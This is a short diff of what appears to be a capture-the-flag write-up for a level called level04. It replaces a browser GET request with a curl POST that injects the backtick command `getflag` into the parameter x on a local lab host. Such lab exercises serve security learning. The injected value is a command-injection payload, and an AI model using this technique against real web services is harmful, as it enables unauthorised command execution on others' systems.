@@ -1,2 +1,2 @@
 cat level04.pl
-On browser, go to : http://192.168.99.106:4747/?x=`getflag`
+Send a POST Request : curl -X POST -F 'x=`getflag`' http://192.168.99.106:4747
